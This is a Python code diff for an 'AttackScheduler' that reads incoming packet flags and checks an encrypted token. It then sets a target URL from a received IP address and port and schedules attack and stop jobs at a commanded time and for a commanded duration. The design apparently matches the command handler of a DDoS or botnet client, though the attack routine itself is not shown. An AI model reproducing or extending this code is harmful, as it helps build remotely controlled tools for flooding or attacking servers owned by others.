@@ -1,7 +1,8 @@
 from app.models import singleton, PacketData
 from app.tasks.attakTarget import AttackTarget
+from app.tasks.encrypt import Encrypt
 from .baseScheduler import BaseScheduler
-from datetime import datetime
+from datetime import datetime, timedelta
 
 
 @singleton
@@ -11,52 +12,52 @@ class AttackScheduler:
         self.scheduler = self.baseScheduler.scheduler
         self.attackTarget = AttackTarget()
         self.packetData = PacketData()
+        self.encrypt = Encrypt()
 
     def onDataReceived(self):
         actions = {
-            0: self.reset,
+            0: lambda: None,
             1: self.setAttack,
-            2: lambda: print("암호 관련"),
+            2: self.setAttack,
             3: self.attackTarget.stop,
         }
-        action = actions.get(self.packetData.flag, lambda: print("Unknown flag"))
+        action = actions.get(self.packetData.flag, lambda: None)
         action()
 
     def setAttack(self):
+        if self.encrypt.decrypt(self.packetData.encryptedToken) is None:
+            return
+
         dateNow = datetime.now()
-        (y, ds, h) = self.packetData.atkDate
-        (m, d) = self.day2monthDay(ds)
         runDate = datetime(
-            dateNow.year + y,
-            m,
-            d,
-            h,
-            1,
+            dateNow.year + self.packetData.atkDate["year"],
+            self.packetData.atkDate["month"],
+            self.packetData.atkDate["day"],
+            self.packetData.atkDate["hour"],
+            self.packetData.atkDate["min"],
         )
 
-        ip = ".".join(self.packetData.ipAddr)
+        stopDate = runDate + timedelta(minutes=self.packetData.atkDuration)
+
+        ip = ".".join(str(octet) for octet in self.packetData.ipAddr)
         port = self.packetData.portNum
-        self.attackTarget.target = f"{ip}:{port}"
+        self.attackTarget.target = f"http://{ip}:{port}"
 
         self.scheduler.add_job(
-            func=self.attackTarget.attack,
+            func=self.attackTarget.schedulerAttack,
             trigger="date",
             run_date=runDate,
             id="attack",
             replace_existing=True,
         )
+        self.scheduler.add_job(
+            func=self.attackTarget.stop,
+            trigger="date",
+            run_date=stopDate,
+            id="stop",
+            replace_existing=True,
+        )
 
     def reset(self):
         self.scheduler.remove_job(id="attack")
-
-    def day2monthDay(self, days):
-        month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
-        month = 1
-        for days_in_month in month_days:
-            if days <= days_in_month:
-                day = days
-                return month, day
-            else:
-                days -= days_in_month
-                month += 1
-        raise ValueError("out of range: days")
+        self.scheduler.remove_job(id="stop")
